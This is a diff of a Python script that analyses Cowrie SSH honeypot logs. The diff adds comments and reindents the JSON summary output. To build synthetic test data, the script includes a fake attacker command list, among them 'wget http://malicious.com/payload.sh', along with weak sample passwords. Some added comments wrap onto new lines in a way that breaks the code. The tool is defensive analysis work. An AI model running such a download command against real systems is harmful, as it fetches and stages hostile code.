@@ -4,13 +4,14 @@ import random
 from collections import Counter, defaultdict
 from datetime import datetime, timedelta
 
+#Configuration settings
 LOG_FILE = "cowrie.json"
 ANONYMISE_IPS = True
 BRUTEFORCE_THRESHOLD = 5
 BRUTEFORCE_WINDOW = timedelta(minutes=10)
 
 
-def generate_fake_attacks():
+def generate_fake_attacks():#Generates synthetic cowrie logs for testing
     random.seed(42)
     fake_ips = [
         "192.168.1.10",
@@ -23,7 +24,7 @@ def generate_fake_attacks():
 "guest"]
     fake_passes = ["123456", "password", "admin", "root", "qwerty", 
 "letmein"]
-    fake_cmds = [
+    fake_cmds = [ #Example attacker commands
         "uname -a",
         "whoami",
         "wget http://malicious.com/payload.sh",
@@ -35,12 +36,12 @@ def generate_fake_attacks():
 
     events = []
     base_time = datetime(2025, 3, 15, 22, 0, 0)
-
+#Simulate 200 attack attempts
     for i in range(200):
         ip = random.choice(fake_ips)
         ts = (base_time + timedelta(seconds=i * 18)).isoformat() + "Z"
         session = f"fakesession{random.randint(1000, 9999)}"
-
+#Failed login attempt
         events.append(
             {
                 "eventid": "cowrie.login.failed",
@@ -51,7 +52,7 @@ def generate_fake_attacks():
                 "session": session,
             }
         )
-
+#Occasionally simulate successful login
         if i % 10 == 0:
             events.append(
                 {
@@ -61,7 +62,7 @@ def generate_fake_attacks():
                     "session": session,
                 }
             )
-
+#Add random commands per sesion
         for cmd in random.sample(fake_cmds, 3):
             events.append(
                 {
@@ -72,7 +73,7 @@ def generate_fake_attacks():
                     "session": session,
                 }
             )
-
+#Save generated logs to file
     with open(LOG_FILE, "w", encoding="utf-8") as f:
         for event in events:
             f.write(json.dumps(event) + "\n")
@@ -80,21 +81,21 @@ def generate_fake_attacks():
     print(f"[+] Generated {len(events)} fake attack events")
 
 
-def anonymise_ip(ip):
+def anonymise_ip(ip): #Hash IP for privacy (GDPR compliance)
     if not ip:
         return "unknown"
     if ANONYMISE_IPS:
         return "anon_" + hashlib.sha256(ip.encode()).hexdigest()[:12]
     return ip
 
-
+#Convert timestamp string into datetime object
 def parse_timestamp(ts):
     try:
         return datetime.fromisoformat(ts.replace("Z", ""))
     except Exception:
         return None
 
-
+#Categorise attacker commands
 def classify_command(cmd):
     if not cmd:
         return "unknown"
@@ -109,7 +110,7 @@ def classify_command(cmd):
     return "other"
 
 
-def main():
+def main():   #Counters for frequency analysis
     src_ips = Counter()
     usernames = Counter()
     passwords = Counter()
@@ -118,17 +119,18 @@ def main():
 
     hourly_attacks = Counter()
     command_categories = Counter()
-    ip_user_map = defaultdict(set)
+    ip_user_map = defaultdict(set)   #Store relationships between IPs and 
+behaviour
     ip_password_map = defaultdict(set)
     ip_timestamps = defaultdict(list)
-
+#read cowrie log file
     with open(LOG_FILE, "r", encoding="utf-8") as f:
         for line in f:
             try:
                 event = json.loads(line)
             except json.JSONDecodeError:
                 continue
-
+         #extract fields
             event_id = event.get("eventid")
             src_ip = anonymise_ip(event.get("src_ip", ""))
             username = event.get("username")
@@ -136,18 +138,19 @@ def main():
             session = event.get("session")
             command = event.get("input")
             timestamp = event.get("timestamp")
-
-            if session:
+          
+            if session: #track unique session
                 sessions.add(session)
-
-            if timestamp:
+          
+            if timestamp:  #process timestamp for timebased analysis
                 ts = parse_timestamp(timestamp)
                 if ts:
                     hourly_attacks[ts.hour] += 1
                     if src_ip:
                         ip_timestamps[src_ip].append(ts)
 
-            if event_id == "cowrie.login.failed":
+            if event_id == "cowrie.login.failed":  #handled failed login 
+attempts
                 if src_ip:
                     src_ips[src_ip] += 1
                 if username:
@@ -157,13 +160,14 @@ def main():
                     passwords[password] += 1
                     ip_password_map[src_ip].add(password)
 
-            if event_id == "cowrie.command.input":
+            if event_id == "cowrie.command.input":   #handle commands 
+executed by attacker
                 if command:
                     commands[command] += 1
                     category = classify_command(command)
                     command_categories[category] += 1
 
-    bruteforce_flagged = []
+    bruteforce_flagged = []  #detect brute force behaviour
     for ip, timestamps in ip_timestamps.items():
         sorted_ts = sorted(timestamps)
         for i, start in enumerate(sorted_ts):
@@ -174,7 +178,7 @@ def main():
                 bruteforce_flagged.append(ip)
                 break
 
-    print("\n=== Cowrie Honeypot Analysis ===\n")
+    print("\n=== Cowrie Honeypot Analysis ===\n")   #output results
 
     print("Top Source IPs:")
     for ip, hits in src_ips.most_common(5):
@@ -215,7 +219,7 @@ def main():
             print(f" [!] {ip}")
     else:
         print(" None flagged.")
-
+#save summary to text file 
     with open("analysis_summary.txt", "w", encoding="utf-8") as out:
         out.write("Cowrie Honeypot Analysis Report\n\n")
         out.write(f"Unique sessions: {len(sessions)}\n\n")
@@ -246,21 +250,21 @@ def main():
                 out.write(f"{ip}\n")
         else:
             out.write("None flagged.\n")
+#save structured summary to JSON
+    summary = {
+        "unique_sessions": len(sessions),
+        "top_ips": dict(src_ips.most_common(5)),
+        "top_usernames": dict(usernames.most_common(5)),
+        "top_passwords": dict(passwords.most_common(5)),
+        "top_commands": dict(commands.most_common(5)),
+        "command_categories": dict(command_categories),
+        "bruteforce_flagged": bruteforce_flagged
+    }
 
-summary = {
-    "unique_sessions": len(sessions),
-    "top_ips": dict(src_ips.most_common(5)),
-    "top_usernames": dict(usernames.most_common(5)),
-    "top_passwords": dict(passwords.most_common(5)),
-    "top_commands": dict(commands.most_common(5)),
-    "command_categories": dict(command_categories),
-    "bruteforce_flagged": bruteforce_flagged
-}
+    with open("analysis_summary.json", "w", encoding="utf-8") as json_out:
+        json.dump(summary, json_out, indent=4)
 
-with open("analysis_summary.json", "w", encoding="utf-8") as json_out:
-    json.dump(summary, json_out, indent=4)
-
-print("JSON summary saved to analysis_summary.json")
+    print("JSON summary saved to analysis_summary.json")
 
     print("\nAnalysis complete. Results saved to analysis_summary.txt\n")
 
